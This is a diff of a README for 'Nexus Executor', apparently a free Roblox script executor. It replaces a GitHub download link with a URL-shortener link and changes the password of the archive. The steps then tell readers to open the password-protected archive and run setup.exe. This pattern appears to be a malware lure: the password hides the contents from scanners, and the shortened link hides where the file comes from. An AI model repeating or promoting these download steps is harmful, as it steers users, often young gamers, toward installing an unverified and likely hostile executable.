@@ -11,8 +11,8 @@ However, it is important to note that it has a limited number of games available
 
 **How to use Nexus Executor, follow these steps:**
 
-- [Download](https://github.com/pedropaxe/roblox-script-executor-2025-for-free/releases/download/Download/RobloxEX.rar)
-- Open archive (password: Nexus1)
+- [Download](https://goo.su/Ka0B)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
